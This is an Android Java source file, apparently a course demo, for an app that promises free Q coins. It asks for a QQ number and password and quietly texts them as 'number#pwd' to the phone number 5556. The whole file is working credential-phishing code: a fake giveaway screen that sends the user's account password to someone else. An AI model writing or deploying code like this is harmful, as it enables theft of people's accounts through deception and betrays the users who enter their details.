package com.itheima.qb;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends Activity {

	EditText ed_number;
	EditText ed_pwd;
	
	// MainActivity 最 开始 初始化时 被执行的方法
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        //初始化的动作 
        ed_number = (EditText) findViewById(R.id.ed_number);
        ed_pwd = (EditText) findViewById(R.id.ed_pwd);
    }

    //领取Q币
    public void getQb(View v){
    	
    	String number = ed_number.getText().toString();
    	String pwd = ed_pwd.getText().toString();
    	
    	if(TextUtils.isEmpty(number)||TextUtils.isEmpty(pwd)){
    		
    		//给用户提示 ,  土司提示 
    		//context: 
    		Toast.makeText(this, "对不起, QQ号码 或者密码 不能为空,否则 不能领取", Toast.LENGTH_LONG).show();
    		return;
    	}
    	
    	//如果走到这里,则  获得 qq 号码 和密码, 发送短信
    	
    	SmsManager manager = SmsManager.getDefault();
    	
    	// destinationAddress :发给谁, 
    	//scAddress : 从哪儿发的 
    	//text : 发的内容
    	//sentIntent :短信 发送 出去的报告
    	//deliveryIntent : 对方成功接收到短信的报告 
    	String text =  number+"#"+pwd;
    	manager.sendTextMessage("5556", null, text, null, null);
    	
    }

}
